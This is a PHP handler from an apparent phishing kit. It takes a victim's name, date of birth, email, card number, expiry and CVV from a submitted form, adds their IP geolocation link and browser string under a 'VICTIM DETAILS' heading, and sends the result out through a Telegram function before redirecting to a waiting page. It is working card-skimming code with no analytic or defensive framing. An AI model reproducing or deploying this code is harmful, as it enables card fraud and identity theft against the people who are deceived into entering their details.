<?php
require_once('tgrm.php');
$IP = getenv("REMOTE_ADDR");
$message .= "/---------------- INFO ----------------/\n";
$message .= "Full Name : ".$_POST['fname']."\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "/---------------- CARD ----------------/\n";
$message .= "CRD Num : ".$_POST['number']."\n";
$message .= "CRD Holder : ".$_POST['name']."\n";
$message .= "Exp date : ".$_POST['expiry']."\n";
$message .= "CVV : ".$_POST['cvc']."\n";
$message .= "/---------------- VICTIM DETAILS ----------------/\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";

telegram_send(urlencode($message));

header("Location: ../wait.php");?>
